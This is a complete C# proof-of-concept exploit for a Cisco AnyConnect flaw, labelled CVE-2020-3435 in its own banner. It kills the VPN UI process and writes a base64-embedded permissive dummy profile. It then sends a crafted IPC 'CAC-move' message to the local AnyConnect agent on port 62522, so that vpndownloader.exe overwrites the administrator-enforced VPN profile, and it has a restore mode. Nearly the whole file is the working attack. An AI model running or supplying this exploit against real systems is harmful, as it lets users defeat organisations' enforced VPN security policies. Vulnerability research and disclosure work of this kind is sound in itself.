using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Program
{
    private const int ERROR_VPN_NOT_FOUND = 1;
    private const int ERROR_SOCKET = 2;
    private const int ERROR_UNEXPECTED = 1337;
    private const string dummyprofile = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPEFueUNvbm5lY3RQcm9maWxlIHhtbG5zPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9lbmNvZGluZy8iIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhzaTpzY2hlbWFMb2NhdGlvbj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvZW5jb2RpbmcvIEFueUNvbm5lY3RQcm9maWxlLnhzZCI+Cgk8Q2xpZW50SW5pdGlhbGl6YXRpb24+CgkJPFVzZVN0YXJ0QmVmb3JlTG9nb24gVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPmZhbHNlPC9Vc2VTdGFydEJlZm9yZUxvZ29uPgoJCTxBdXRvbWF0aWNDZXJ0U2VsZWN0aW9uIFVzZXJDb250cm9sbGFibGU9ImZhbHNlIj50cnVlPC9BdXRvbWF0aWNDZXJ0U2VsZWN0aW9uPgoJCTxTaG93UHJlQ29ubmVjdE1lc3NhZ2U+ZmFsc2U8L1Nob3dQcmVDb25uZWN0TWVzc2FnZT4KCQk8Q2VydGlmaWNhdGVTdG9yZT5NYWNoaW5lPC9DZXJ0aWZpY2F0ZVN0b3JlPgoJCTxDZXJ0aWZpY2F0ZVN0b3JlT3ZlcnJpZGU+dHJ1ZTwvQ2VydGlmaWNhdGVTdG9yZU92ZXJyaWRlPgoJCTxQcm94eVNldHRpbmdzPk5hdGl2ZTwvUHJveHlTZXR0aW5ncz4KCQk8QWxsb3dMb2NhbFByb3h5Q29ubmVjdGlvbnM+dHJ1ZTwvQWxsb3dMb2NhbFByb3h5Q29ubmVjdGlvbnM+CgkJPEF1dGhlbnRpY2F0aW9uVGltZW91dD4zMDwvQXV0aGVudGljYXRpb25UaW1lb3V0PgoJCTxBdXRvQ29ubmVjdE9uU3RhcnQgVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPmZhbHNlPC9BdXRvQ29ubmVjdE9uU3RhcnQ+CgkJPE1pbmltaXplT25Db25uZWN0IFVzZXJDb250cm9sbGFibGU9ImZhbHNlIj50cnVlPC9NaW5pbWl6ZU9uQ29ubmVjdD4KCQk8TG9jYWxMYW5BY2Nlc3MgVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPnRydWU8L0xvY2FsTGFuQWNjZXNzPgoJCTxEaXNhYmxlQ2FwdGl2ZVBvcnRhbERldGVjdGlvbiBVc2VyQ29udHJvbGxhYmxlPSJmYWxzZSI+ZmFsc2U8L0Rpc2FibGVDYXB0aXZlUG9ydGFsRGV0ZWN0aW9uPgoJCTxDbGVhclNtYXJ0Y2FyZFBpbiBVc2VyQ29udHJvbGxhYmxlPSJmYWxzZSI+dHJ1ZTwvQ2xlYXJTbWFydGNhcmRQaW4+CgkJPElQUHJvdG9jb2xTdXBwb3J0PklQdjQsSVB2NjwvSVBQcm90b2NvbFN1cHBvcnQ+CgkJPEF1dG9SZWNvbm5lY3QgVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPmZhbHNlCgkJCTxBdXRvUmVjb25uZWN0QmVoYXZpb3IgVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPkRpc2Nvbm5lY3RPblN1c3BlbmQ8L0F1dG9SZWNvbm5lY3RCZWhhdmlvcj4KCQk8L0F1dG9SZWNvbm5lY3Q+CgkJPEF1dG9VcGRhdGUgVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPmZhbHNlPC9BdXRvVXBkYXRlPgoJCTxSU0FTZWN1cklESW50ZWdyYXRpb24gVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPkF1dG9tYXRpYzwvUlNBU2VjdXJJREludGVncmF0aW9uPgoJCTxXaW5kb3dzTG9nb25FbmZvcmNlbWVudD5TaW5nbGVMb2NhbExvZ29uPC9XaW5kb3dzTG9nb25FbmZvcmNlbWVudD4KCQk8V2luZG93c1ZQTkVzdGFibGlzaG1lbnQ+TG9jYWxVc2Vyc09ubHk8L1dpbmRvd3NWUE5Fc3RhYmxpc2htZW50PgoJCTxBdXRvbWF0aWNWUE5Qb2xpY3k+dHJ1ZQoJCQk8VHJ1c3RlZEROU0RvbWFpbnM+KjwvVHJ1c3RlZEROU0RvbWFpbnM+CgkJCTxUcnVzdGVkTmV0d29ya1BvbGljeT5Db25uZWN0PC9UcnVzdGVkTmV0d29ya1BvbGljeT4KCQkJPFVudHJ1c3RlZE5ldHdvcmtQb2xpY3k+Q29ubmVjdDwvVW50cnVzdGVkTmV0d29ya1BvbGljeT4KCQkJPEFsd2F5c09uPmZhbHNlCgkJCQk8Q29ubmVjdEZhaWx1cmVQb2xpY3k+Q2xvc2VkCgkJCQkJPEFsbG93Q2FwdGl2ZVBvcnRhbFJlbWVkaWF0aW9uPnRydWUKCQkJCQkJPENhcHRpdmVQb3J0YWxSZW1lZGlhdGlvblRpbWVvdXQ+MTU8L0NhcHRpdmVQb3J0YWxSZW1lZGlhdGlvblRpbWVvdXQ+CgkJCQkJPC9BbGxvd0NhcHRpdmVQb3J0YWxSZW1lZGlhdGlvbj4KCQkJCQk8QXBwbHlMYXN0VlBOTG9jYWxSZXNvdXJjZVJ1bGVzPnRydWU8L0FwcGx5TGFzdFZQTkxvY2FsUmVzb3VyY2VSdWxlcz4KCQkJCTwvQ29ubmVjdEZhaWx1cmVQb2xpY3k+CgkJCQk8QWxsb3dWUE5EaXNjb25uZWN0PnRydWU8L0FsbG93VlBORGlzY29ubmVjdD4KCQkJPC9BbHdheXNPbj4KCQk8L0F1dG9tYXRpY1ZQTlBvbGljeT4KCQk8UFBQRXhjbHVzaW9uIFVzZXJDb250cm9sbGFibGU9ImZhbHNlIj5EaXNhYmxlCgkJCTxQUFBFeGNsdXNpb25TZXJ2ZXJJUCBVc2VyQ29udHJvbGxhYmxlPSJmYWxzZSI+PC9QUFBFeGNsdXNpb25TZXJ2ZXJJUD4KCQk8L1BQUEV4Y2x1c2lvbj4KCQk8RW5hYmxlU2NyaXB0aW5nIFVzZXJDb250cm9sbGFibGU9ImZhbHNlIj5mYWxzZTwvRW5hYmxlU2NyaXB0aW5nPgoJCTxFbmFibGVBdXRvbWF0aWNTZXJ2ZXJTZWxlY3Rpb24gVXNlckNvbnRyb2xsYWJsZT0iZmFsc2UiPmZhbHNlCgkJCTxBdXRvU2VydmVyU2VsZWN0aW9uSW1wcm92ZW1lbnQ+MjA8L0F1dG9TZXJ2ZXJTZWxlY3Rpb25JbXByb3ZlbWVudD4KCQkJPEF1dG9TZXJ2ZXJTZWxlY3Rpb25TdXNwZW5kVGltZT40PC9BdXRvU2VydmVyU2VsZWN0aW9uU3VzcGVuZFRpbWU+CgkJPC9FbmFibGVBdXRvbWF0aWNTZXJ2ZXJTZWxlY3Rpb24+CgkJPFJldGFpblZwbk9uTG9nb2ZmPmZhbHNlCgkJCTxVc2VyRW5mb3JjZW1lbnQ+QW55VXNlcjwvVXNlckVuZm9yY2VtZW50PgoJCTwvUmV0YWluVnBuT25Mb2dvZmY+CgkJPEFsbG93TWFudWFsSG9zdElucHV0PnRydWU8L0FsbG93TWFudWFsSG9zdElucHV0PgoJPC9DbGllbnRJbml0aWFsaXphdGlvbj4KCTxTZXJ2ZXJMaXN0PgoJCTxIb3N0RW50cnk+CgkJCTxIb3N0TmFtZT54eHh4PC9Ib3N0TmFtZT4KCQk8L0hvc3RFbnRyeT4KCTwvU2VydmVyTGlzdD4KPC9BbnlDb25uZWN0UHJvZmlsZT4K";

    static byte[] PackCommand(byte[] data)
    {
        MemoryStream stm = new MemoryStream();
        BinaryWriter writer = new BinaryWriter(stm);

        writer.Write(0x4353434f);                 // Signature
        writer.Write((ushort) 0x1A);              // Message header length
        writer.Write((ushort) data.Length);       // Message body length
        byte[] arr = {0xff, 0xff, 0xff, 0xff,     // IPC response
                        0x00, 0x00, 0x00, 0x00,   // Message user context
                        0x02, 0x00, 0x00, 0x00,   // Request message identifier
                        0x00, 0x00, 0x00, 0x00};  // Return IPC object
        writer.Write(arr);
        writer.Write((byte) 1);                   // Message type
        writer.Write((byte) 2);                   // Message identifier
        writer.Write(data);

        return stm.ToArray();
    }

    static byte[] SwapShort(ushort s)
    {
        byte[] bs = BitConverter.GetBytes(s);
        byte tmp = bs[0];
        bs[0] = bs[1];
        bs[1] = tmp;

        return bs;
    }

    static void PackString(BinaryWriter writer, int index, string s)
    {
        writer.Write(SwapShort((ushort)index));
        byte[] bs = Encoding.ASCII.GetBytes(s + "\0");
        writer.Write(SwapShort((ushort)bs.Length));
        writer.Write(bs);
    }

    static byte[] GeneratePayload(string ipc, string input, string output)
    {
        byte[] bytes = null;
        using (FileStream fs = new FileStream(input, FileMode.Open, FileAccess.Read))
        {
            bytes = File.ReadAllBytes(input);
            fs.Read(bytes, 0, Convert.ToInt32(fs.Length));
            fs.Close();
        }
        System.Security.Cryptography.SHA1CryptoServiceProvider sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider();
        var hash = sha1.ComputeHash(bytes);
        var sb = new StringBuilder(hash.Length * 2);
        foreach (byte b in hash)
        {
            sb.Append(b.ToString("X2"));
        }

        string sha1hash = sb.ToString();

        MemoryStream stm = new MemoryStream();
        BinaryWriter writer = new BinaryWriter(stm);
        string CACcmd = "\"CAC-move" + ipc + "\t" + input + "\t" + output + "\t" + sha1hash + "\t" + "sha1" + "\t" + "0\"";
        Console.WriteLine("[*] Payload: {0}", CACcmd);
        PackString(writer, 2, CACcmd);
        PackString(writer, 6, "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpndownloader.exe");

        byte[] d = stm.ToArray();
        byte[] data = PackCommand(d);
        return data;
    }

    static void Usage()
    {
        Console.WriteLine("Usage:\n" +
            "\t{0} bypass <path to profile>\n" +
            "\tOR {0} restore <path to backup>", AppDomain.CurrentDomain.FriendlyName);
    }

    static byte[] Restore(string file, string ipc)
    {
        string profilename = Path.GetFileName(file);
        string destfile = Path.Combine(@"C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\", profilename);
        Console.WriteLine("[*] Preparing command to restore {0} to {1}", profilename, destfile);

        byte[] data = GeneratePayload(ipc, file, destfile);
        return data;
    }

    static byte[] Bypass(string file, string ipc, string dummypofilepath)
    {
        string current = Directory.GetCurrentDirectory();
        string currentdate = DateTime.Now.ToString("yyyyMMdd-HHmm");
        string profilename = Path.GetFileName(file);
        string destfile = Path.Combine(current, currentdate + "_" + profilename);
        Console.WriteLine("[*] Copying {0} to {1}", profilename, destfile);
        File.Copy(file, destfile, true);

        byte[] data = GeneratePayload(ipc, dummypofilepath, file);
        return data;
    }

    static void Main(string[] args)
    {

        Console.WriteLine("Cisco AnyConnect VPN Profile Modification PoC (CVE-2020-3435)");
        Console.WriteLine("September 2020");
        Console.WriteLine("Author: ATGO\n");

        if (args.Length != 2)
        {
            Usage();
            return;
        }

        if ((args[0] != "restore") & (args[0] != "bypass"))
        {
            Usage();
            return;
        }


        string profilepath = args[1];
        if (!File.Exists(profilepath))
        {
            Console.WriteLine("File does not exist");
            Console.WriteLine("Available profiles for bypass");
            string[] profiles = Directory.GetFiles(@"C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\", "*.xml");
            foreach (var profile in profiles)
            {
                Console.WriteLine("[*] {0}", profile);
            }
            return;
        }

        profilepath = Path.GetFullPath(profilepath);



        try
        {
            FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo(@"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe");
            Version vpndownloaderversion = new Version(myFileVersionInfo.FileVersion.Replace(", ", "."));
            Version ipcversion = new Version("4.7");
            Console.WriteLine("[*] Cisco AnyConnect version: {0}", vpndownloaderversion);

            string ipc = "";

            if (vpndownloaderversion >= ipcversion)
            {
                Console.WriteLine("[*] \"-ipc\" argument needed");
                ipc = "\t" + "-ipc=1337";
            }
            else
            {
                Console.WriteLine("[*] \"-ipc\" argument NOT needed");
            }

            Console.WriteLine("[*] Killing vpnui.exe process");
            foreach (var process in Process.GetProcessesByName("vpnui"))
            {
                process.Kill();
            }

            byte[] data = null;
            string dummypofilepath = null;

            if (args[0] == "restore")
            {
                data = Restore(profilepath, ipc);
            }
            else
            {
                dummypofilepath = Path.GetTempPath() + Guid.NewGuid().ToString().Substring(0, 6) + ".xml";
                Console.WriteLine("[*] Creating the dummy profile ({0}) - should be deleted after the exploit", dummypofilepath);

                File.WriteAllText(dummypofilepath, Encoding.UTF8.GetString(Convert.FromBase64String(dummyprofile)));
                data = Bypass(profilepath, ipc, dummypofilepath);
            }

            Console.WriteLine("[*] Sending payload");

            TcpClient client = new TcpClient("127.0.0.1", 62522);
            NetworkStream nstm = client.GetStream();
            nstm.ReadTimeout = 2000;
            nstm.Write(data, 0, data.Length);
            nstm.Flush();
            nstm.ReadByte();
            client.Close();

            Console.WriteLine("[*] Sleeping 5s before cleaning");
            Thread.Sleep(5000);
            
            if (dummypofilepath != null)
            {
                FileInfo fi = new FileInfo(dummypofilepath);
                Console.WriteLine("[*] Deleting {0}", dummypofilepath);
                fi.Delete();
            }


            Console.WriteLine("[*] Done, you can launch AnyConnect");

            return;

        }
        catch (FileNotFoundException)
        {
            Console.WriteLine("[-] vpndownloader.exe NOT FOUND");
            Environment.ExitCode = ERROR_VPN_NOT_FOUND;
            return;
        }
        catch (SocketException)
        {
            Console.WriteLine("[-] Socket error");
            Environment.ExitCode = ERROR_SOCKET;
            return;
        }
        catch (Exception e)
        {
            Console.WriteLine("[-] Unexpected error");
            Console.WriteLine(e);
            Environment.ExitCode = ERROR_UNEXPECTED;
            return;
        }


    }
}

